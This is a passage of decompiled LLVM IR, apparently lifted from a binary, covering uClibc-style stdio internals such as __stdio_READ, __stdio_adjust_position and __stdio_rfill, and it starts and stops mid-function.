  %v2_1c394 = icmp eq i32 %v1_1c38c, 0
  br i1 %v2_1c394, label %dec_label_pc_1c3c8, label %dec_label_pc_1c39c

dec_label_pc_1c39c:                               ; preds = %bb
  %v1_1c39c = add i32 %v0_1c36c, 56
  store i32 %v1_1c39c, i32* @r4, align 4
  store i32 98440, i32* %r3.global-to-local, align 4
  store i32 %v2_1c35c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v1_1c39c, i32* @r2, align 4
  %v1_1c3b4 = call i32 @_pthread_cleanup_push_defer()
  %v0_1c3b8 = load i32, i32* @r4, align 4
  store i32 %v0_1c3b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r3.global-to-local, align 4
  store i32 115656, i32* @lr, align 4
  %v2_1c3c4 = call i32 @__pthread_return_0(i32 %v0_1c3b8)
  store i32 %v2_1c3c4, i32* %r0.global-to-local, align 4
  %v0_1c3c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c3c8

dec_label_pc_1c3c8:                               ; preds = %.thread, %bb, %dec_label_pc_1c39c
  %v0_1c3d4 = phi i32 [ %v0_1c36c, %.thread ], [ %v0_1c36c, %bb ], [ %v0_1c3c8.pre, %dec_label_pc_1c39c ]
  %v1_1c3c8 = add i32 %v0_1c3d4, 1
  %v2_1c3c8 = inttoptr i32 %v1_1c3c8 to i8*
  %v3_1c3c8 = load i8, i8* %v2_1c3c8, align 1
  %v4_1c3c8 = zext i8 %v3_1c3c8 to i32
  store i32 %v4_1c3c8, i32* %r3.global-to-local, align 4
  %v1_1c3cc = and i32 %v4_1c3c8, 64
  %v2_1c3cc = icmp eq i32 %v1_1c3cc, 0
  br i1 %v2_1c3cc, label %dec_label_pc_1c3e4, label %dec_label_pc_1c3d4

dec_label_pc_1c3d4:                               ; preds = %dec_label_pc_1c3c8
  store i32 %v0_1c3d4, i32* @r0, align 4
  %v0_1c3d8 = call i32 @__stdio_wcommit()
  store i32 %v0_1c3d8, i32* %r0.global-to-local, align 4
  %v2_1c3dc = icmp eq i32 %v0_1c3d8, 0
  br i1 %v2_1c3dc, label %dec_label_pc_1c3e4, label %dec_label_pc_1c458

dec_label_pc_1c3e4:                               ; preds = %dec_label_pc_1c3d4, %dec_label_pc_1c3c8
  %v0_1c3e4 = load i32, i32* %r6.global-to-local, align 4
  %v7_1c3e4 = icmp eq i32 %v0_1c3e4, 1
  br i1 %v7_1c3e4, label %dec_label_pc_1c3ec, label %dec_label_pc_1c3e4.dec_label_pc_1c400_crit_edge

dec_label_pc_1c3e4.dec_label_pc_1c400_crit_edge:  ; preds = %dec_label_pc_1c3e4
  br label %dec_label_pc_1c400

dec_label_pc_1c3ec:                               ; preds = %dec_label_pc_1c3e4
  %v0_1c3ec = load i32, i32* @r5, align 4
  store i32 %v0_1c3ec, i32* %r0.global-to-local, align 4
  %v2_1c3f0 = ptrtoint i32* %stack_var_-28 to i32
  %v2_1c3f4 = inttoptr i32 %v0_1c3ec to i8*
  %v3_1c3f4 = call i32 @__stdio_adjust_position(i8* %v2_1c3f4, i32 %v2_1c3f0)
  store i32 %v3_1c3f4, i32* %r0.global-to-local, align 4
  %v1_1c3f8 = icmp slt i32 %v3_1c3f4, 0
  br i1 %v1_1c3f8, label %dec_label_pc_1c458, label %dec_label_pc_1c3ec.dec_label_pc_1c400_crit_edge

dec_label_pc_1c3ec.dec_label_pc_1c400_crit_edge:  ; preds = %dec_label_pc_1c3ec
  %v0_1c400.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c400

dec_label_pc_1c400:                               ; preds = %dec_label_pc_1c3e4.dec_label_pc_1c400_crit_edge, %dec_label_pc_1c3ec.dec_label_pc_1c400_crit_edge
  %v0_1c400 = phi i32 [ %v0_1c3e4, %dec_label_pc_1c3e4.dec_label_pc_1c400_crit_edge ], [ %v0_1c400.pre, %dec_label_pc_1c3ec.dec_label_pc_1c400_crit_edge ]
  store i32 %v0_1c400, i32* %r2.global-to-local, align 4
  %v0_1c404 = load i32, i32* @r5, align 4
  store i32 %v0_1c404, i32* %r0.global-to-local, align 4
  %v4_1c40c = call i32 @__stdio_seek(i32 %v0_1c404, i32* nonnull %stack_var_-28, i32 %v0_1c400)
  store i32 %v4_1c40c, i32* %r0.global-to-local, align 4
  %v1_1c410 = icmp slt i32 %v4_1c40c, 0
  br i1 %v1_1c410, label %dec_label_pc_1c458, label %dec_label_pc_1c418

dec_label_pc_1c418:                               ; preds = %dec_label_pc_1c400
  %v0_1c418 = load i32, i32* @r5, align 4
  %v1_1c418 = inttoptr i32 %v0_1c418 to i32*
  %v2_1c418 = load i32, i32* %v1_1c418, align 4
  %v3_1c41c = udiv i32 %v2_1c418, 65536
  store i32 %v3_1c41c, i32* %r3.global-to-local, align 4
  %v1_1c420 = add i32 %v0_1c418, 8
  %v2_1c420 = inttoptr i32 %v1_1c420 to i32*
  %v3_1c420 = load i32, i32* %v2_1c420, align 4
  store i32 %v3_1c420, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1c428 = and i32 %v3_1c41c, 65464
  store i32 %v1_1c428, i32* %r3.global-to-local, align 4
  %v3_1c42c9 = udiv i32 %v2_1c418, 16777216
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1c434 = trunc i32 %v3_1c42c9 to i8
  %v3_1c434 = inttoptr i32 %v0_1c418 to i8*
  store i8 %v1_1c434, i8* %v3_1c434, align 1
  %v0_1c438 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c438 = load i32, i32* @r5, align 4
  %v2_1c438 = add i32 %v1_1c438, 28
  %v3_1c438 = inttoptr i32 %v2_1c438 to i32*
  store i32 %v0_1c438, i32* %v3_1c438, align 4
  %v0_1c43c = load i32, i32* %r0.global-to-local, align 4
  %v1_1c43c = trunc i32 %v0_1c43c to i8
  %v2_1c43c = load i32, i32* @r5, align 4
  %v3_1c43c = add i32 %v2_1c43c, 2
  %v4_1c43c = inttoptr i32 %v3_1c43c to i8*
  store i8 %v1_1c43c, i8* %v4_1c43c, align 1
  %v0_1c440 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c440 = trunc i32 %v0_1c440 to i8
  %v2_1c440 = load i32, i32* @r5, align 4
  %v3_1c440 = add i32 %v2_1c440, 1
  %v4_1c440 = inttoptr i32 %v3_1c440 to i8*
  store i8 %v1_1c440, i8* %v4_1c440, align 1
  %v0_1c444 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c444 = load i32, i32* @r5, align 4
  %v2_1c444 = add i32 %v1_1c444, 16
  %v3_1c444 = inttoptr i32 %v2_1c444 to i32*
  store i32 %v0_1c444, i32* %v3_1c444, align 4
  %v0_1c448 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c448 = load i32, i32* @r5, align 4
  %v2_1c448 = add i32 %v1_1c448, 20
  %v3_1c448 = inttoptr i32 %v2_1c448 to i32*
  store i32 %v0_1c448, i32* %v3_1c448, align 4
  %v0_1c44c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c44c = load i32, i32* @r5, align 4
  %v2_1c44c = add i32 %v1_1c44c, 24
  %v3_1c44c = inttoptr i32 %v2_1c44c to i32*
  store i32 %v0_1c44c, i32* %v3_1c44c, align 4
  %v0_1c450 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c450 = load i32, i32* @r5, align 4
  %v2_1c450 = add i32 %v1_1c450, 44
  %v3_1c450 = inttoptr i32 %v2_1c450 to i32*
  store i32 %v0_1c450, i32* %v3_1c450, align 4
  br label %dec_label_pc_1c45c

dec_label_pc_1c458:                               ; preds = %dec_label_pc_1c3d4, %dec_label_pc_1c400, %dec_label_pc_1c3ec
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c45c

dec_label_pc_1c45c:                               ; preds = %dec_label_pc_1c418, %dec_label_pc_1c458
  %v0_1c45c = load i32, i32* %r7.global-to-local, align 4
  %v2_1c45c = icmp eq i32 %v0_1c45c, 0
  br i1 %v2_1c45c, label %.thread6, label %bb18

bb18:                                             ; preds = %dec_label_pc_1c45c
  store i32 %v2_1c35c, i32* %r0.global-to-local, align 4
  store i32 98448, i32* %r3.global-to-local, align 4
  store i32 115828, i32* @lr, align 4
  call void @__pseudo_branch(i32 98448)
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1c45c, %dec_label_pc_1c374, %bb18
  %v0_1c474 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1c474, i32* %r0.global-to-local, align 4
  store i32 %v3_1c354, i32* @r4, align 4
  store i32 %v6_1c354, i32* @r5, align 4
  ret i32 %v0_1c474

; uselistorder directives
  uselistorder i32 %v3_1c41c, { 1, 0 }
  uselistorder i32 %v0_1c400, { 1, 0 }
  uselistorder i32 %v3_1c388, { 1, 0, 2 }
  uselistorder i32 %v2_1c35c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 98448, { 0, 3, 4, 1, 5, 6, 2 }
  uselistorder i32 56, { 15, 10, 3, 4, 5, 6, 12, 13, 9, 2, 14, 11, 0, 16, 7, 1, 8 }
  uselistorder label %.thread6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c45c, { 1, 0 }
  uselistorder label %dec_label_pc_1c458, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1c400, { 1, 0 }
  uselistorder label %dec_label_pc_1c3c8, { 2, 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1c490 = load i32, i32* @r4, align 4
  store i32 %v3_1c490, i32* %stack_var_-12, align 4
  %v0_1c494 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c494 = add i32 %v0_1c494, 1
  %v2_1c494 = inttoptr i32 %v1_1c494 to i8*
  %v3_1c494 = load i8, i8* %v2_1c494, align 1
  %v4_1c494 = zext i8 %v3_1c494 to i32
  store i32 %v4_1c494, i32* %r3.global-to-local, align 4
  %v1_1c498 = and i32 %v4_1c494, 4
  store i32 %v1_1c498, i32* %r5.global-to-local, align 4
  %v2_1c498 = icmp eq i32 %v1_1c498, 0
  store i32 %v0_1c494, i32* @r4, align 4
  br i1 %v2_1c498, label %.thread, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_1c490, i32* @r4, align 4
  ret i32 0

.thread:                                          ; preds = %entry
  %v1_1c4a8 = icmp slt i32 %arg2, 0
  br i1 %v1_1c4a8, label %bb7, label %bb8

bb7:                                              ; preds = %.thread
  store i32 2147483647, i32* @r2, align 4
  br label %bb8

bb8:                                              ; preds = %.thread, %bb7
  %v1_1c4b0 = add i32 %v0_1c494, 4
  %v2_1c4b0 = inttoptr i32 %v1_1c4b0 to i32*
  %v3_1c4b0 = load i32, i32* %v2_1c4b0, align 4
  store i32 %v3_1c4b0, i32* %r0.global-to-local, align 4
  %v1_1c4b4 = call i32 @__GI_read(i32 %v3_1c4b0)
  store i32 %v1_1c4b4, i32* %r0.global-to-local, align 4
  %tmp9 = icmp slt i32 %v1_1c4b4, 1
  br i1 %tmp9, label %bb11, label %bb10

bb10:                                             ; preds = %bb8
  %v7_1c4bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_1c4bc, i32* @r4, align 4
  ret i32 %v1_1c4b4

bb11:                                             ; preds = %bb8
  %v2_1c4b8 = icmp eq i32 %v1_1c4b4, 0
  %v0_1c4c0 = load i32, i32* @r4, align 4
  %v1_1c4c0 = inttoptr i32 %v0_1c4c0 to i32*
  %v2_1c4c0 = load i32, i32* %v1_1c4c0, align 4
  store i32 %v2_1c4c0, i32* %r3.global-to-local, align 4
  %v3_1c4c8 = udiv i32 %v2_1c4c0, 65536
  br i1 %v2_1c4b8, label %dec_label_pc_1c4c8, label %dec_label_pc_1c4e0

dec_label_pc_1c4c8:                               ; preds = %bb11
  %v1_1c4cc = or i32 %v3_1c4c8, 4
  store i32 %v1_1c4cc, i32* %r3.global-to-local, align 4
  %v3_1c4d01 = udiv i32 %v2_1c4c0, 16777216
  %v1_1c4d4 = trunc i32 %v3_1c4d01 to i8
  %v3_1c4d4 = inttoptr i32 %v0_1c4c0 to i8*
  store i8 %v1_1c4d4, i8* %v3_1c4d4, align 1
  %v0_1c4d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c4d8 = trunc i32 %v0_1c4d8 to i8
  %v2_1c4d8 = load i32, i32* @r4, align 4
  %v3_1c4d8 = add i32 %v2_1c4d8, 1
  %v4_1c4d8 = inttoptr i32 %v3_1c4d8 to i8*
  store i8 %v1_1c4d8, i8* %v4_1c4d8, align 1
  %v2_1c4dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1c4dc, i32* @r4, align 4
  ret i32 0

dec_label_pc_1c4e0:                               ; preds = %bb11
  %v1_1c4e4 = or i32 %v3_1c4c8, 8
  store i32 %v1_1c4e4, i32* %r3.global-to-local, align 4
  %v3_1c4e82 = udiv i32 %v2_1c4c0, 16777216
  %v0_1c4ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1c4ec, i32* %r0.global-to-local, align 4
  %v1_1c4f0 = trunc i32 %v3_1c4e82 to i8
  %v3_1c4f0 = inttoptr i32 %v0_1c4c0 to i8*
  store i8 %v1_1c4f0, i8* %v3_1c4f0, align 1
  %v0_1c4f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c4f4 = trunc i32 %v0_1c4f4 to i8
  %v2_1c4f4 = load i32, i32* @r4, align 4
  %v3_1c4f4 = add i32 %v2_1c4f4, 1
  %v4_1c4f4 = inttoptr i32 %v3_1c4f4 to i8*
  store i8 %v1_1c4f4, i8* %v4_1c4f4, align 1
  %v2_1c4f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1c4f8, i32* @r4, align 4
  ret i32 %v0_1c4ec

; uselistorder directives
  uselistorder i32 %v3_1c4c8, { 1, 0 }
  uselistorder i32 %v0_1c4c0, { 1, 0, 2 }
  uselistorder i32 %v1_1c4b4, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 0 }
  uselistorder i32 2147483647, { 6, 0, 1, 7, 2, 5, 3, 4 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_1c4fc = load i32, i32* @r4, align 4
  store i32 %v3_1c4fc, i32* %stack_var_-12, align 4
  %v3_1c500 = load i8, i8* %arg1, align 1
  %v4_1c500 = zext i8 %v3_1c500 to i32
  %v2_1c504 = add i32 %tmp, 1
  %v3_1c504 = inttoptr i32 %v2_1c504 to i8*
  %v4_1c504 = load i8, i8* %v3_1c504, align 1
  %v5_1c504 = zext i8 %v4_1c504 to i32
  store i32 %v5_1c504, i32* %r3.global-to-local, align 4
  %v4_1c508 = mul nuw nsw i32 %v4_1c500, 256
  %tmp16 = urem i8 %v4_1c504, 4
  %v2_1c50c = icmp eq i8 %tmp16, 0
  br i1 %v2_1c50c, label %bb, label %dec_label_pc_1c51c

bb:                                               ; preds = %entry
  store i32 0, i32* @lr, align 4
  br label %bb13

dec_label_pc_1c51c:                               ; preds = %entry
  %v1_1c50c = zext i8 %tmp16 to i32
  %v1_1c51c = add nsw i32 %v1_1c50c, -1
  store i32 %v1_1c51c, i32* @lr, align 4
  %v7_1c51c = icmp eq i8 %tmp16, 1
  br i1 %v7_1c51c, label %bb13, label %dec_label_pc_1c524

dec_label_pc_1c524:                               ; preds = %dec_label_pc_1c51c
  %v1_1c524 = and i32 %v4_1c508, 2048
  %v2_1c524 = icmp eq i32 %v1_1c524, 0
  br i1 %v2_1c524, label %bb13, label %dec_label_pc_1c52c

dec_label_pc_1c52c:                               ; preds = %dec_label_pc_1c524
  %v7_1c52c = icmp eq i32 %v1_1c51c, 2
  br i1 %v7_1c52c, label %dec_label_pc_1c5b0, label %dec_label_pc_1c534

dec_label_pc_1c534:                               ; preds = %dec_label_pc_1c52c
  %v2_1c534 = add i32 %tmp, 40
  %v3_1c534 = inttoptr i32 %v2_1c534 to i32*
  %v4_1c534 = load i32, i32* %v3_1c534, align 4
  store i32 %v4_1c534, i32* %r3.global-to-local, align 4
  %v2_1c538 = icmp eq i32 %v4_1c534, 0
  br i1 %v2_1c538, label %dec_label_pc_1c540, label %dec_label_pc_1c5b0

dec_label_pc_1c540:                               ; preds = %dec_label_pc_1c534
  %v2_1c540 = add i32 %tmp, 44
  %v3_1c540 = inttoptr i32 %v2_1c540 to i32*
  %v4_1c540 = load i32, i32* %v3_1c540, align 4
  store i32 %v4_1c540, i32* %r3.global-to-local, align 4
  %v2_1c544 = add i32 %tmp, 3
  %v3_1c544 = inttoptr i32 %v2_1c544 to i8*
  %v4_1c544 = load i8, i8* %v3_1c544, align 1
  %v5_1c544 = zext i8 %v4_1c544 to i32
  %tmp11 = icmp slt i32 %v4_1c540, 1
  br i1 %tmp11, label %.thread, label %bb12

.thread:                                          ; preds = %dec_label_pc_1c540
  %v1_1c5506 = sub nsw i32 0, %v5_1c544
  store i32 %v1_1c5506, i32* @lr, align 4
  br label %bb13

bb12:                                             ; preds = %dec_label_pc_1c540
  %v7_1c54c = add i32 %tmp, 2
  %v8_1c54c = inttoptr i32 %v7_1c54c to i8*
  %v9_1c54c = load i8, i8* %v8_1c54c, align 1
  %v10_1c54c = zext i8 %v9_1c54c to i32
  store i32 %v10_1c54c, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v10_1c54c, %v5_1c544
  %v7_1c554 = sub nsw i32 0, %sum
  store i32 %v7_1c554, i32* @lr, align 4
  br label %bb13

bb13:                                             ; preds = %.thread, %bb, %dec_label_pc_1c524, %dec_label_pc_1c51c, %bb12
  %v1_1c568 = phi i32 [ %v1_1c51c, %dec_label_pc_1c524 ], [ %v1_1c51c, %dec_label_pc_1c51c ], [ 0, %bb ], [ %v7_1c554, %bb12 ], [ %v1_1c5506, %.thread ]
  %v1_1c558 = and i32 %v5_1c504, 64
  %v2_1c558 = icmp eq i32 %v1_1c558, 0
  %v2_1c55c = add i32 %tmp, 16
  %v3_1c55c = inttoptr i32 %v2_1c55c to i32*
  %v4_1c55c = load i32, i32* %v3_1c55c, align 4
  store i32 %v4_1c55c, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1c558, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1c568 = sub i32 %v1_1c568, %v4_1c55c
  store i32 %v2_1c568, i32* %r3.global-to-local, align 4
  %v1_1c56c = inttoptr i32 %arg2 to i32*
  %v2_1c56c = load i32, i32* %v1_1c56c, align 4
  %v3_1c56c = add i32 %arg2, 4
  %v4_1c56c = inttoptr i32 %v3_1c56c to i32*
  %v5_1c56c = load i32, i32* %v4_1c56c, align 4
  store i32 %v5_1c56c, i32* %r1.global-to-local, align 4
  %v2_1c570 = add i32 %storemerge, %v2_1c568
  store i32 %v2_1c570, i32* %r4.global-to-local, align 4
  %v2_1c574 = sub i32 %v5_1c56c, %v2_1c570
  store i32 %v2_1c574, i32* %r3.global-to-local, align 4
  %v2_1c578 = and i32 %v2_1c570, 1073741824
  %v3_1c578 = icmp ne i32 %v2_1c578, 0
  %v4_1c578 = ashr i32 %v2_1c570, 31
  %v6_1c578 = icmp eq i1 %v3_1c578, false
  %v7_1c578 = sub i32 %v2_1c56c, %v4_1c578
  %v9_1c578 = sext i1 %v6_1c578 to i32
  %v10_1c578 = add i32 %v9_1c578, %v7_1c578
  %v2_1c57c = sub i32 %v10_1c578, %v2_1c56c
  %v4_1c57c = xor i32 %v10_1c578, %v2_1c56c
  %v5_1c57c = xor i32 %v2_1c57c, %v10_1c578
  %v6_1c57c = and i32 %v5_1c57c, %v4_1c57c
  %v7_1c57c = icmp slt i32 %v6_1c57c, 0
  %v8_1c57c = icmp slt i32 %v2_1c57c, 0
  %v9_1c57c = icmp eq i32 %v10_1c578, %v2_1c56c
  store i32 %v10_1c578, i32* %v1_1c56c, align 4
  %v5_1c580 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1c580, i32* %v4_1c56c, align 4
  %v3_1c584 = xor i1 %v8_1c57c, %v7_1c57c
  %v4_1c584 = or i1 %v9_1c57c, %v3_1c584
  br i1 %v4_1c584, label %dec_label_pc_1c588, label %dec_label_pc_1c594

dec_label_pc_1c588:                               ; preds = %bb13
  br i1 %v9_1c57c, label %dec_label_pc_1c58c, label %dec_label_pc_1c598thread-pre-split

dec_label_pc_1c58c:                               ; preds = %dec_label_pc_1c588
  %v0_1c58c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c58c = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v0_1c58c, %v1_1c58c
  br i1 %tmp17, label %dec_label_pc_1c594, label %dec_label_pc_1c598thread-pre-split

dec_label_pc_1c594:                               ; preds = %dec_label_pc_1c58c, %bb13
  %v0_1c594 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c594 = sub i32 0, %v0_1c594
  store i32 %v1_1c594, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c598

dec_label_pc_1c598thread-pre-split:               ; preds = %dec_label_pc_1c58c, %dec_label_pc_1c588
  %v0_1c598.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c598

dec_label_pc_1c598:                               ; preds = %dec_label_pc_1c598thread-pre-split, %dec_label_pc_1c594
  %v0_1c598 = phi i32 [ %v0_1c598.pr, %dec_label_pc_1c598thread-pre-split ], [ %v1_1c594, %dec_label_pc_1c594 ]
  %v1_1c598 = icmp slt i32 %v0_1c598, 0
  br i1 %v1_1c598, label %dec_label_pc_1c5a0, label %dec_label_pc_1c5b4

dec_label_pc_1c5a0:                               ; preds = %dec_label_pc_1c598
  %v0_1c5a0 = call i32 @__GI___errno_location()
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1c5a8 = inttoptr i32 %v0_1c5a0 to i32*
  store i32 75, i32* %v2_1c5a8, align 4
  %v0_1c5b4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c5b4

dec_label_pc_1c5b0:                               ; preds = %dec_label_pc_1c534, %dec_label_pc_1c52c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1c5b4

dec_label_pc_1c5b4:                               ; preds = %dec_label_pc_1c598, %dec_label_pc_1c5a0, %dec_label_pc_1c5b0
  %v0_1c5b4 = phi i32 [ %v0_1c598, %dec_label_pc_1c598 ], [ %v0_1c5b4.pre, %dec_label_pc_1c5a0 ], [ -1, %dec_label_pc_1c5b0 ]
  %v2_1c5b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1c5b8, i32* @r4, align 4
  ret i32 %v0_1c5b4

; uselistorder directives
  uselistorder i1 %v9_1c57c, { 1, 0 }
  uselistorder i32 %v2_1c57c, { 1, 0 }
  uselistorder i32 %v10_1c578, { 2, 4, 0, 1, 3 }
  uselistorder i32 %v2_1c56c, { 2, 0, 1, 3 }
  uselistorder i8 %tmp16, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 75, { 0, 5, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c5b4, { 2, 1, 0 }
  uselistorder label %bb13, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c5bc = load i32, i32* @r4, align 4
  store i32 %v3_1c5bc, i32* %stack_var_-8, align 4
  %v1_1c5c0 = add i32 %arg1, 8
  %v1_1c5c4 = inttoptr i32 %v1_1c5c0 to i32*
  %v2_1c5c4 = load i32, i32* %v1_1c5c4, align 4
  store i32 %v2_1c5c4, i32* @r1, align 4
  %v3_1c5c4 = add i32 %arg1, 12
  %v4_1c5c4 = inttoptr i32 %v3_1c5c4 to i32*
  %v5_1c5c4 = load i32, i32* %v4_1c5c4, align 4
  %v2_1c5c8 = sub i32 %v5_1c5c4, %v2_1c5c4
  store i32 %v2_1c5c8, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1c5d0 = inttoptr i32 %arg1 to i8*
  %v4_1c5d0 = call i32 @__stdio_READ(i8* %v3_1c5d0, i32 %v2_1c5c4, i32 %v2_1c5c8)
  %v0_1c5d4 = load i32, i32* @r4, align 4
  %v1_1c5d4 = add i32 %v0_1c5d4, 8
  %v2_1c5d4 = inttoptr i32 %v1_1c5d4 to i32*
  %v3_1c5d4 = load i32, i32* %v2_1c5d4, align 4
  store i32 %v3_1c5d4, i32* %r2.global-to-local, align 4
  %v2_1c5d8 = add i32 %v3_1c5d4, %v4_1c5d0
  %v2_1c5dc = add i32 %v0_1c5d4, 20
  %v3_1c5dc = inttoptr i32 %v2_1c5dc to i32*
  store i32 %v2_1c5d8, i32* %v3_1c5dc, align 4
  %v0_1c5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c5e0 = load i32, i32* @r4, align 4
  %v2_1c5e0 = add i32 %v1_1c5e0, 16
  %v3_1c5e0 = inttoptr i32 %v2_1c5e0 to i32*
  store i32 %v0_1c5e0, i32* %v3_1c5e0, align 4
  %v2_1c5e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1c5e4, i32* @r4, align 4
  ret i32 %v4_1c5d0

; uselistorder directives
  uselistorder i32 %v4_1c5d0, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1c5e8 = load i32, i32* @r4, align 4
  store i32 %v3_1c5e8, i32* %stack_var_-12, align 4
  %v0_1c5ec = load i32, i32* @r0, align 4
  %v1_1c5ec = inttoptr i32 %v0_1c5ec to i8*
  %v2_1c5ec = load i8, i8* %v1_1c5ec, align 1
  %v3_1c5ec = zext i8 %v2_1c5ec to i32
  store i32 %v3_1c5ec, i32* %r2.global-to-local, align 4
  %v1_1c5f0 = add i32 %v0_1c5ec, 1
  %v2_1c5f0 = inttoptr i32 %v1_1c5f0 to i8*
  %v3_1c5f0 = load i8, i8* %v2_1c5f0, align 1
  %v4_1c5f0 = zext i8 %v3_1c5f0 to i32
  store i32 %v4_1c5f0, i32* %r3.global-to-local, align 4
  %v4_1c5f4 = mul nuw nsw i32 %v3_1c5ec, 256
  %v5_1c5f4 = or i32 %v4_1c5f0, %v4_1c5f4
  store i32 %v5_1c5f4, i32* %r2.global-to-local, align 4
  %v0_1c5f8 = load i32, i32* @r1, align 4
  %v2_1c5f8 = and i32 %v0_1c5f8, %v5_1c5f4
  %v4_1c5f8 = icmp eq i32 %v2_1c5f8, 0
  store i32 %v0_1c5ec, i32* @r4, align 4
  br i1 %v4_1c5f8, label %dec_label_pc_1c604, label %dec_label_pc_1c61c

dec_label_pc_1c604:                               ; preds = %entry
  %v1_1c604 = and i32 %v5_1c5f4, 2176
  %v2_1c604 = icmp eq i32 %v1_1c604, 0
  br i1 %v2_1c604, label %dec_label_pc_1c60c, label %dec_label_pc_1c630

dec_label_pc_1c60c:                               ; preds = %dec_label_pc_1c604
  %v2_1c60c = or i32 %v0_1c5f8, %v5_1c5f4
  store i32 %v2_1c60c, i32* %r2.global-to-local, align 4
  %v3_1c610 = sdiv i32 %v2_1c60c, 256
  store i32 %v3_1c610, i32* %r3.global-to-local, align 4
  %v1_1c614 = trunc i32 %v3_1c610 to i8
  store i8 %v1_1c614, i8* %v1_1c5ec, align 1
  %v0_1c618 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c618 = trunc i32 %v0_1c618 to i8
  %v2_1c618 = load i32, i32* @r0, align 4
  %v3_1c618 = add i32 %v2_1c618, 1
  %v4_1c618 = inttoptr i32 %v3_1c618 to i8*
  store i8 %v1_1c618, i8* %v4_1c618, align 1
  %v0_1c61c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1c61c

dec_label_pc_1c61c:                               ; preds = %entry, %dec_label_pc_1c60c
  %v0_1c61c = phi i32 [ %v0_1c5ec, %entry ], [ %v0_1c61c.pre, %dec_label_pc_1c60c ]
  %v1_1c61c = inttoptr i32 %v0_1c61c to i8*
